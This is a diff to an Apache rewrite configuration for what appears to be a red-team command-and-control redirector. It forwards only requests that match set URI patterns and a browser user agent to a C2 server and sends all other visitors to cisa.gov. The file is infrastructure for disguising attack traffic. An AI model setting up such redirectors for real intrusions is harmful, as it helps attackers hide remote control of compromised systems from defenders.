@@ -23,10 +23,10 @@ RewriteRule ^.*$ "{c2server}%{{REQUEST_URI}}" [P,L]
 ## Only allow GET and POST methods to pass to the C2 server
 RewriteCond %{REQUEST_METHOD} ^(GET|POST) [NC]
 ## Profile URIs
-RewriteCond %{REQUEST_URI} ^(/functionalStatus/PsBtYzazdPc8X0swSdxnxb5UO7y-RXbI-.*|/Meeting/ir3HhJw/.*|/rest/2/meetingsUWtdB-CENmTMuMrOxg31IJEEh9zomztgL.*)$
+RewriteCond %{REQUEST_URI} ^(/owa/vJqrCaqXyHwlySsaOaLZf21xI.*|/rpc/5831114.*|/rpc/9613597.*|/owa/ozlOrFlTUgqX-rf53eoUA3ibbVo7rlHRo.*)$
 ## Profile UserAgent
-RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows NT 10.0; Win64; x64\) AppleWebKit/537.36 \(KHTML, like Gecko\) Chrome/89.0.4389.133 Safari/537.36"
-RewriteRule ^.*$ "https://sample.domain%{REQUEST_URI}" [P,L]
+RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows NT 10.0; Win64; x64\) AppleWebKit/537.36 \(KHTML, like Gecko\) Chrome/82.0.4063.0 Safari/537.36 Edg/82.0.439.1"
+RewriteRule ^.*$ "https://172.19.0.5%{REQUEST_URI}" [P,L]
 
 ## Redirect all other traffic here
 RewriteRule ^.*$ https://cisa.gov/? [L,R=302]
